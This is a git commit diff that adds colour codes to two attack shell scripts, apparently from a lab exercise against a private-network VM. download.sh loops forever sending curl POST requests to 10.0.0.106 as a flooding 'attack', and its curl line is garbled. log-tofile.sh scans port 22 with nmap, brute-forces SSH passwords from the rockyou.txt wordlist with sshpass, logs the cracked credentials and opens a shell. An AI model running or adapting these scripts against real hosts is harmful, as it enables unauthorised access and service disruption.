05bfcd2014d8954565726450e608ceee51cc7589
sandu9618 <sandunipavithra9611@gmail.com>
2020-12-29 18:29:27 +0530

    Added styles

--- download.sh
+++ download.sh
@@ -2,13 +2,14 @@ Red=$'\e[1;31m'
 Green=$'\e[1;32m'
 Blue=$'\e[1;34m'
 Yellow=$'\e[1;33m'
+Reset=$'\e[0,m'
 
-echo "$Yellow #####################################################"
-echo "$Red Attack is in progress!!!"
-echo "$Yellow #####################################################"
+echo "$Yellow ##################################################### $Reset"
+echo "$Red Attack is in progress!!! $Reset"
+echo "$Yellow #####################################################  $Reset"
 
 
 while :
-do 
+do
 	curl -X POST -d @req.json ssh cirros@10.0.0.106
 done
--- log-tofile.sh
+++ log-tofile.sh
@@ -3,6 +3,7 @@ Red=$'\e[1;31m'
 Green=$'\e[1;32m'
 Blue=$'\e[1;34m'
 Yellow=$'\e[1;33m'
+Reset=$'\e[0,m'
 
 
 login () { #user, ip
@@ -10,23 +11,23 @@ login () { #user, ip
 
 	nmap $1 -p 22
 	if [ $? -eq 0 ];
-		then 
+		then
 			pass=""
 			while read line;
-			do 
+			do
 				if sshpass -p "$line" ssh -t -t $1@$2 -p 22 "set -- '$SSHPATH/$ID'.*; [ -e \"\$1\" ]";
 					then
 						pass="$line"
-						echo "$Yellow #####################################################"
-						echo "$Green Login Successful"
-						echo "$Yellow #####################################################"
-						echo "$1 $pass $2" | tee -a $output 									
+						echo "$Yellow ##################################################### $Reset"
+						echo "$Green Login Successful  $Reset"
+						echo "$Yellow ##################################################### $Reset"
+						echo "$1 $pass $2" | tee -a $output
 						break
 				fi
 			done < rockyou.txt
 			sshpass -p "$pass" ssh -t -t "$1"@"$2" -p 22
 		else
-			echo "$Red Port is closed!!!"
+			echo "$Red Port is closed!!!  $Reset"
 	fi
 
 }
@@ -36,19 +37,19 @@ login () { #user, ip
 while read -r line;
 do
 	IFS=" " read -ra ADDR <<<"$line"
-	
+
 	for i in "${ADDR[0]}";
 	do
-	USER="$i" 
+	USER="$i"
 	done
 
 	for i in "${ADDR[1]}";
-	do 
+	do
 	IP="$i"
 	done
 
-	echo "$Blue Attempting to login to $USER..."
+	echo "$Blue Attempting to login to $USER... $Reset"
 	login $USER $IP &
-	
+
 done < input.txt
 exit
